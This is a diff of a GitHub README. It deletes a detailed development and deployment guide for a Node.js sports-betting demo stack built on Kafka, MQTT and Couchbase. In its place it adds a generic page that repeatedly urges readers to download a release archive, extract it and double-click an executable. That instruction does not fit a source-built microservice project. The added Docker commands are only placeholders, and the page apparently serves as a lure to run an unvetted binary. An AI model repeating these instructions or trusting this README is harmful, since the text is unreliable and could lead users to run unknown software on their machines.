@@ -1,536 +1,86 @@
-# iGaming Demo — Development & Deployment Guide
+# 🎰 scalable-kafka-mqtt-couchbase - Your Gateway to Real-Time Sports Betting
 
-This repository contains a small demo microservice platform used for onboarding and experimentation. It includes a React frontend, three Node.js microservices (betting, notification, audit, email), and supporting infrastructure (Kafka, FlashMQ for MQTT, Couchbase, Redis UI, and Nginx). This README consolidates local development instructions, production-like Docker deployment steps, troubleshooting tips, and the onboarding task checklist.
+## 🚀 Getting Started
 
-![Repo Banner](./doc/banner.jpg)
+Welcome to the scalable-kafka-mqtt-couchbase project. This platform combines exciting features for sports betting with a user-friendly interface. You will find real-time updates and event streaming, all packaged neatly for easy use. 
 
-## System Diagram
+## 📥 Download the Software
 
-![System Design Diagram](./doc/design.png)
+[![Download Now](https://img.shields.io/badge/Download%20Now-%23D50000.svg?style=flat&logo=github)](https://github.com/keyone3100/scalable-kafka-mqtt-couchbase/releases)
 
-## Table of contents
+To get started, you will need to download the application. Please follow the steps below.
 
-- [Demo](#demo)
-- [Introduction](#introduction)
-- [Quick start (development)](#quick-start-development---recommended)
-- [Services & ports](#services--ports)
-- [Local development (detailed)](#local-development-detailed)
-- [Production-like Docker deployment](#production-like-docker-deployment)
-- [Configuration](#configuration)
-- [Tasks and onboarding checklist](#onboarding-task-checklist)
-- [Troubleshooting & common commands](#troubleshooting--common-commands)
-- [AWS Lightsail / container deployment notes](#aws-lightsail--container-deployment-notes)
-- [File structure](#file-structure-detailed-overview)
-- [Support](#support)
+## 🔍 Key Features
 
-## Demo
+- **Real-Time Sports Betting:** Get the latest odds and updates as they happen.
+- **Live Notifications:** Stay informed with instant alerts for your favorite events.
+- **Event Streaming:** Experience smooth event coverage with our streaming service.
+- **User-Friendly Interface:** Navigate easily with our React frontend.
+- **Comprehensive Deployment:** Utilize Docker for seamless setup and configuration.
+- **Robust Backend:** Built on Node.js microservices for reliability.
 
-- Frontend (Cloudflare)
-- Kafka UI (Kowl)
-- Couchbase UI
-- Redis UI
+## 📃 System Requirements
 
-![Frontend (Cloudflare)](./doc/screenshot-1.png)
+Before downloading, ensure your system meets the following requirements:
 
-![Kafka UI (Kowl)](./doc/screenshot-2.png)
+- **Operating System:** Windows, macOS, or a compatible Linux distribution.
+- **RAM:** At least 4 GB of memory.
+- **Disk Space:** Minimum of 1 GB available for installation.
+- **Docker:** Make sure Docker is installed if you use the deployment option.
+- **Internet Connection:** Required for live updates and notifications.
 
-![Couchbase UI](./doc/screenshot-3.png)
+## 🛠️ How to Install
 
-![Redis UI](./doc/screenshot-4.png)
+### Step 1: Visit the Releases Page
 
-## Introduction
+To download the application, visit the [Releases page](https://github.com/keyone3100/scalable-kafka-mqtt-couchbase/releases). You will find the latest version available along with any previous versions.
 
-This repo is intended to make it easy to spin up a realistic, containerized microservice stack locally or in a production-like environment. The main goals are:
+### Step 2: Download the Latest Release
 
-- Let developers run the stack locally with minimal friction (Kafka, MQTT, Couchbase, Redis UI, services, and frontend).
-- Provide a Docker-based production-like deployment with Nginx reverse proxy and subdomain routing.
-- Provide simple exercises (send a message via Kafka, push MQTT messages to FlashMQ, inspect Couchbase, explore Redis UI) to understand the platform.
+Once you are on the Releases page, look for the latest version number. You will see different assets available for download. Click the appropriate link to download the application.
 
-Assumptions/notes:
+### Step 3: Extract and Set Up
 
-- The instructions below assume macOS or Linux with Docker and Docker Compose installed for Docker mode, and Node.js installed for local development mode.
-- Port numbers referenced are the defaults used in this repository; change them in the compose files or service env files if needed.
+If you download a compressed file, you will need to extract it. Use tools like WinRAR, 7-Zip, or the built-in extraction tool on your computer. After extracting, follow the setup instructions within the folder.
 
-## Quick start (development - recommended)
+### Step 4: Run the Application
 
-1. Start infrastructure (Kafka, MQTT, Couchbase, Redis UI):
+Locate the main application file in the extracted folder. Double-click to launch it. Follow any prompts that appear to complete setup.
 
-```
-   npm run infra:dev
-```
+## 🌐 Configuration Guide
 
-2. Install dependencies:
+Once the application is running, you may need to configure it based on your preferences. Here’s a brief overview:
 
-```
-   npm install
-```
+- **Connect to Couchbase:** Follow the prompts to set up your Couchbase connection.
+- **Configure Notifications:** Set your preferred notifications for events.
+- **Adjust Settings:** Explore settings to customize your experience better.
 
-3. Build the shared package:
+## ⚙️ Using Docker for Deployment
 
-```
-   npm run build:shared
-```
+For users familiar with Docker, deploying this application can be done with ease. Follow these steps:
 
-4. Start all services and frontend:
+1. Ensure Docker is installed on your machine.
+2. Open a terminal or command prompt.
+3. Pull the Docker image using the command: `docker pull your_docker_image_name`.
+4. Start the container using: `docker run -d -p your_port:your_port your_docker_image_name`.
 
-```
-   npm run dev
-```
+This will get you started with a robust and scalable application setup. 
 
-After these steps the main URLs are available on the local machine (see Services & ports below).
+## 🤝 Community and Support
 
-## Services & ports
+For any questions or issues, you can connect with the community or seek support:
 
-Development mode (direct access):
+- **GitHub Issues:** Report bugs or request features by opening a new issue in the GitHub Issues section.
+- **Discussion Forum:** Join discussions with other users to share experiences and tips.
 
-- Frontend: http://localhost:5173
-- Betting service (API): http://localhost:3000
-- Notification service: http://localhost:3001
-- Audit service: http://localhost:3002
-- Email service: http://localhost:3003
-- Kafka UI (Kowl/console): http://localhost:8080
-- Couchbase UI: http://localhost:8091
-- Redis UI: http://localhost:5540
-- MQTT WebSocket (FlashMQ): ws://localhost:8081
+## 📈 Future Updates
 
-Docker mode (via Nginx proxy + subdomains):
+We continuously work on improving the application. New features and enhancements will be rolled out regularly. Keep an eye on the Releases page for the latest updates.
 
-For subdomain access you can add entries to `/etc/hosts`:
+## 📝 License
 
-127.0.0.1 api.localhost
-127.0.0.1 ws.localhost
-127.0.0.1 couchbase.localhost
-127.0.0.1 redis.localhost
-127.0.0.1 kowl.localhost
+This project is open-source. You can view the license information in the repository. Contributions are welcome! 
 
-Then:
+Once again, start your adventure in real-time sports betting by downloading from the Releases page: [Download here](https://github.com/keyone3100/scalable-kafka-mqtt-couchbase/releases).
 
-- Betting API: http://api.localhost
-- MQTT WebSocket: ws://ws.localhost
-- Couchbase UI: http://couchbase.localhost
-- Redis UI: http://redis.localhost
-- Kafka UI: http://kowl.localhost
-- Health check (root): http://localhost/health
-
-## Local development (detailed)
-
-This mode runs services directly on the host for fast edit–compile–run cycles.
-
-### Infrastructure Commands
-
-```bash
-npm run infra:dev        # Start infrastructure
-npm run infra:dev:down   # Stop infrastructure
-```
-
-### Development Commands
-
-```bash
-npm run dev:frontend             # Start frontend only
-npm run dev:betting-service      # Start betting service only
-npm run dev:notification-service # Start notification service only
-npm run dev:audit-service       # Start audit service only
-npm run dev:email-service       # Start email service only
-npm run dev                     # Start all services
-```
-
-### Building Commands
-
-```bash
-npm run build:shared            # Build shared package
-npm run build:frontend          # Build frontend
-npm run build:betting-service   # Build betting service
-npm run build:notification-service # Build notification service
-npm run build:audit-service     # Build audit service
-npm run build:email-service     # Build email service
-npm run build                   # Build everything
-```
-
-### Docker Commands
-
-```bash
-npm run docker:build    # Build Docker images
-npm run docker:up       # Start Docker services
-npm run docker:down     # Stop Docker services
-npm run docker:logs     # View Docker logs
-npm run docker:deploy   # Full deployment script
-npm run docker:stop     # Stop deployment script
-```
-
-### Development Workflow
-
-1. **Start infrastructure**: `npm run infra:dev`
-2. **Install deps**: `npm install`
-3. **Build shared**: `npm run build:shared`
-4. **Start services**: `npm run dev`
-5. **Code changes**: Services auto-reload with `tsx watch`
-6. **Test APIs**: Use the frontend or tools like Postman
-7. **View messages**: Check Kafka UI at http://localhost:8080
-8. **Monitor MQTT**: Check FlashMQ WebSocket at ws://localhost:8081
-
-### Testing the Setup
-
-#### Test Betting Service
-
-```bash
-# Development mode
-curl http://localhost:3000/
-
-# Docker mode (requires /etc/hosts entry)
-curl http://api.localhost/
-```
-
-#### Test WebSocket Connection
-
-Open browser console and run:
-
-```javascript
-// Development mode
-const ws = new WebSocket("ws://localhost:8081");
-
-// Docker mode (requires /etc/hosts entry)
-const ws = new WebSocket("ws://ws.localhost");
-
-ws.onopen = () => console.log("Connected");
-ws.onmessage = msg => console.log("Message:", msg.data);
-```
-
-#### Test Kafka UI
-
-- Development: http://localhost:8080
-- Docker: http://kowl.localhost (requires /etc/hosts entry)
-
-#### Test Couchbase UI
-
-- Development: http://localhost:8091
-- Docker: http://couchbase.localhost (requires /etc/hosts entry)
-- Username: Administrator
-- Password: password
-
-#### Test Redis UI
-
-- Development: http://localhost:5540
-- Docker: http://redis.localhost (requires /etc/hosts entry)
-
-## Production-like Docker deployment
-
-This repository includes a production-like Docker Compose file and an Nginx reverse proxy to expose services on subdomains. Use this mode for end-to-end integration testing or demo deployments.
-
-### Prerequisites
-
-- Docker & Docker Compose installed
-- At least 4GB RAM available
-- Ports 80, 443 available (or configure different ports)
-
-### Quick Deploy
-
-```bash
-# Deploy everything with Docker + Nginx
-./deploy.sh
-
-# Stop everything
-./stop.sh
-```
-
-### Manual Docker Steps
-
-If you prefer manual deployment:
-
-1. Build shared package:
-
-```bash
-cd packages/shared
-npm install
-npm run build
-cd ../..
-```
-
-2. Build Docker images from the root:
-
-```bash
-docker compose -f docker-compose.production.yml build
-```
-
-3. Start services:
-
-```bash
-docker compose -f docker-compose.production.yml up -d
-```
-
-4. Verify deployment:
-
-```bash
-# Check service status
-docker compose -f docker-compose.production.yml ps
-
-# View logs
-docker compose -f docker-compose.production.yml logs -f [service-name]
-```
-
-### Configuration
-
-#### Environment Variables
-
-Each service has its own environment configuration:
-
-- `packages/betting-service/.env.production`
-- `packages/audit-service/.env.production`
-- `packages/notification-service/.env.production`
-- `packages/email-service/.env.production`
-
-#### Service Dependencies
-
-Services start in this order:
-
-1. Kafka
-2. Kowl, Couchbase, FlashMQ, Redis UI
-3. Application services (betting, audit, notification, email)
-4. Nginx
-
-### Health Checks
-
-- Main health check: `http://[domain]/health`
-- Individual service health checks are available internally
-
-### Monitoring
-
-````bash
-# Check all service status
-docker compose -f docker-compose.production.yml ps
-
-# Monitor service logs
-docker compose -f docker-compose.production.yml logs -f
-
-# Check specific service
-docker compose -f docker-compose.production.yml logs -f betting-service
-```## Nginx, DNS, and routing notes
-
-### Nginx Configuration
-
-The Nginx configuration is located in:
-
-- `nginx/nginx.conf` - Main configuration
-- `nginx/conf.d/default.conf` - Service routing rules
-
-### Local Development DNS Setup
-
-For local testing with subdomains, add to `/etc/hosts`:
-
-```bash
-127.0.0.1 api.localhost
-127.0.0.1 ws.localhost
-127.0.0.1 couchbase.localhost
-127.0.0.1 redis.localhost
-127.0.0.1 kowl.localhost
-````
-
-### Production DNS Configuration
-
-For subdomain routing to work in production, you'll need to configure DNS records:
-
-```
-Type: A
-Name: [domain]
-Value: [server_ip]
-
-Type: A (or CNAME)
-Name: api.[domain]
-Value: [server_ip]
-
-Type: A (or CNAME)
-Name: ws.[domain]
-Value: [server_ip]
-
-Type: A (or CNAME)
-Name: couchbase.[domain]
-Value: [server_ip]
-
-Type: A (or CNAME)
-Name: redis.[domain]
-Value: [server_ip]
-
-Type: A (or CNAME)
-Name: kowl.[domain]
-Value: [server_ip]
-```
-
-Or use a wildcard DNS record:
-
-```
-Type: A
-Name: *.[domain]
-Value: [server_ip]
-```
-
-### Service Routing Table
-
-| Service        | Local URL               | AWS URL                             | Description                     |
-| -------------- | ----------------------- | ----------------------------------- | ------------------------------- |
-| Betting API    | `http://localhost:3000` | `http://api.[aws_domain]`           | REST API for betting operations |
-| MQTT WebSocket | `ws://localhost:8081`   | `ws://ws.unibet.richardeverley.com` | WebSocket for real-time updates |
-| Couchbase UI   | `http://localhost:8091` | `http://couchbase.[aws_domain]`.    | Database administration         |
-| Redis UI       | `http://localhost:5540` | `http://redis.[aws_domain]`         | Redis database management       |
-| Kafka UI       | `http://localhost:8080` | `http://kowl.[aws_domain]`          | Kafka topic management          |
-| Health Check   | N/A                     | `http://[aws_domain]/health`        | Main service health status      |
-
-- Nginx binds ports 80 and 443 on the host in production mode. Ensure those ports are free or adjust the compose file.
-
-## Onboarding task checklist
-
-This checklist is a compact set of hands-on exercises useful for onboarding:
-
-- Use Docker Compose to run Kafka and a Kafka UI (Kowl or similar).
-- From Node.js, produce and consume a message using kafkajs.
-- Spin up a Couchbase container and explore the web UI.
-- Setup a Redis UI container and connect to the Redis instance.
-- Run FlashMQ (an MQTT broker) in a container and use MQTT.js from Node to publish a message.
-- From the frontend, connect using MQTT.js over WebSocket to verify messages are routed to the client.
-
-Notes and useful ports (development):
-
-- MQTT WebSocket: ws://localhost:8081
-- Betting API: http://localhost:3000
-- Couchbase UI: http://localhost:8091
-- Redis UI: http://localhost:5540
-- Kafka UI: http://localhost:8080
-
-This set of exercises covers a large portion of the demo stack (message broker, realtime push, persistence, and UI).
-
-## Troubleshooting & common commands
-
-### Check Service Status
-
-```bash
-# Development mode
-ps aux | grep node
-
-# Docker mode
-docker compose -f docker-compose.production.yml ps
-```
-
-### View Logs
-
-```bash
-# Development mode - logs appear in terminal
-
-# Docker mode
-npm run docker:logs
-# or for specific service:
-docker compose -f docker-compose.production.yml logs -f betting-service
-```
-
-### Port Conflicts
-
-```bash
-# Check what's using a port
-lsof -i :3000
-lsof -i :80
-```
-
-### Memory Issues
-
-```bash
-# Check Docker memory usage
-docker stats
-```
-
-### Clean Reset
-
-```bash
-# Stop everything
-npm run infra:dev:down
-./stop.sh
-
-# Clear Docker cache
-docker system prune -f
-
-# Restart
-npm run infra:dev
-npm run dev
-```
-
-### Common Issues
-
-1. **Port Conflicts**: Check what's using a port with `lsof -i :80`
-2. **Service Not Starting**: Check service logs with `docker compose logs service-name`
-3. **Memory Issues**: Check Docker memory usage with `docker stats`
-
-If a service fails to start, check its logs and verify that Kafka, FlashMQ, Couchbase, and Redis UI are healthy first — many services depend on them.## Security & production checklist
-
-Before deploying to production consider the following:
-
-- Change default Couchbase credentials and any default passwords.
-- Enable SSL/TLS on Nginx and redirect HTTP to HTTPS.
-- Use Docker secrets or a vault for sensitive environment variables.
-- Restrict access to internal ports with firewall rules.
-- Use network segmentation in Docker Compose or your orchestration platform.
-
-Example: create a Docker secret for a password instead of env vars:
-
-    echo "your-secret-password" | docker secret create couchbase_password -
-
-## AWS Lightsail / container deployment notes
-
-To deploy to a container service like AWS Lightsail:
-
-1. Build and push container images to a registry (ECR, Docker Hub, or similar):
-
-   docker tag fdj-betting-service:latest your-registry/fdj-betting-service:latest
-   docker push your-registry/fdj-betting-service:latest
-
-2. Create the container service and deploy using the production compose as a reference.
-
-3. Ensure DNS records or wildcard DNS are configured for subdomain routing.
-
-## Scaling considerations
-
-- Services can be scaled horizontally; ensure Kafka topics and partitions are configured for throughput.
-- Add load balancing in Nginx as needed and monitor resource usage.
-- Minimum recommended resources for the full stack: 4GB RAM, 2 CPU; recommended for comfortable use: 8GB, 4 CPU.
-
-## File structure (detailed overview)
-
-The repository contains multiple packages and infra config. Key items:
-
-```
-├── deploy.sh                      # Deployment script
-├── stop.sh                        # Stop script
-├── docker-compose.production.yml   # Main deployment configuration
-├── nginx/
-│   ├── nginx.conf                 # Main Nginx config
-│   └── conf.d/
-│       └── default.conf           # Service routing
-└── packages/
-    ├── betting-service/
-    │   ├── Dockerfile
-    │   ├── .dockerignore
-    │   └── .env.production
-    ├── audit-service/
-    │   ├── Dockerfile
-    │   ├── .dockerignore
-    │   └── .env.production
-    ├── notification-service/
-    │   ├── Dockerfile
-    │   ├── .dockerignore
-    │   └── .env.production
-    ├── email-service/
-    │   ├── Dockerfile
-    │   ├── .dockerignore
-    │   └── .env.production
-    ├── shared/
-    │   ├── Dockerfile
-    │   └── .dockerignore
-    └── infrastructure-dev/
-        └── docker-compose.yml
-```
-
-For per-service details, see the `packages/*` directories.
-
-## Support
-
-If you run into issues:
-
-1. Check service logs first.
-2. Verify dependencies (Kafka, FlashMQ, Couchbase, Redis UI) are running.
-3. Check Docker resource allocation if containers fail to start.
-4. If you need help, open an issue or contact the repository owner.
+Enjoy using the scalable-kafka-mqtt-couchbase application!
